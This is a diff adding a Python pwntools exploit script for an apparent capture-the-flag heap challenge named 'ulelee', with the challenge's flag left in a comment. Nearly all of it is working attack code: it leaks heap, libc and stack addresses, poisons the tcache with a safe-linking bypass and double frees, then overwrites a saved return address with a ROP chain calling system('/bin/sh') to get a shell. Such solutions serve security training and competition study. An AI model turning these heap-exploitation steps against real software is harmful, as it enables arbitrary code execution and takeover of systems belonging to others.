@@ -1,0 +1,127 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./ulelee")
+libc = ELF("./libc.so.6")
+# context.log_level='debug'
+context.terminal = ["alacritty","-e"]
+p = remote("ulele.chal.crewc.tf", 1337)
+# p.recvuntil("Solution?")
+# input()
+# p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def protect(addr1,addr2):
+    return addr1^(addr2>>12)
+
+
+def add(data):
+    sla(">",b"1")
+    sa("load:",data)
+def dels(idx):
+    sla(">","3")
+    sla(":",str(idx))
+def show(idx):
+    sla(">",b"2")
+    sla(":",str(idx))
+    p.recvuntil("Data: ")
+    return u64(p.recvuntil("\n",drop=True).ljust(8,b"\0"))
+for i in range(10):
+    add(b"aaaaaaa")
+dels(0x100)
+# dels(0x101)
+addr = show(0)<<12
+heap = addr - 0x12000
+log.info(f"leak: {hex(heap)}")
+for i in range(18):
+    add(str(i).encode()*0x30)
+for i in range(7):
+    # pop tcache
+    dels(i+10)
+# for i in range(17):
+# dels(0x116)
+fakechunk = heap +0x12910
+addrxor = heap+0x12920
+freeaddr = heap +0x12900
+log.info(f"fake chunk: {hex(fakechunk)}")
+dels(257)
+dels(258)
+dels(257)
+for i in range(7):
+    add("pop tcache")
+add(p64(protect(fakechunk,addrxor)))
+add(b"pop tcache")
+add(b"pop tcache")
+add(p64(protect(0,addrxor))+p64(0x511))
+# for i in range(7):
+#     dels(i+11)
+dels(0x100)
+
+addr = show(0)
+libc.address = addr -2059488
+log.info(f"libc: {hex(libc.address)}")
+add(b"a"*0x50+p64(libc.sym.environ))
+stack = show(1) - 0x206a8
+log.info(f"stack: {hex(stack)}")
+fakechunk3 = heap+0x12a60
+fakechunk4 = heap+0x12af0
+add(b"a"*72+p64(0x21)+p64(fakechunk3))
+add(b"a"*72+p64(0x21)+p64(fakechunk3))
+for i in range(18):
+    add(b"a"*72+p64(0x21)+p64(fakechunk3))
+# for i in range(7):
+    #fill tcache
+    # dels(i+17)
+dels(17)
+dels(18)
+# dels(1824)
+dels(0x12c)
+dels(0x12d)
+dels(44)
+addrxor3 = heap+0x12c10
+save_rip = stack+0x20528-8
+ret = libc.address + 0x0000000000023159
+pop_rdi = libc.address + 0x00000000000240e5
+
+add(p64(protect(save_rip,addrxor3)))
+add(b"pop tcache")
+# gdbs()
+add(b"pop tcache")
+add(b"a"*8+p64(ret)+p64(pop_rdi)+p64(libc.search("/bin/sh").__next__())+p64(libc.sym.system))
+#crew{ulal_ulele_ulala_this_is_miss_type_of_datatype:(_LINZ_IS_HERE}
+# dels(0x102)
+# dels(28)
+# dels(0x102)
+# dels(0x105)
+# dels(0x104)
+# dels(0x105)
+# for i in range(7):
+#     add(b"a"*0x64)
+# fakechunk2 = heap +0x12900
+# addrxor2 = heap+0x12910
+# add(p64(protect(fakechunk2,addrxor2)))
+
+
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
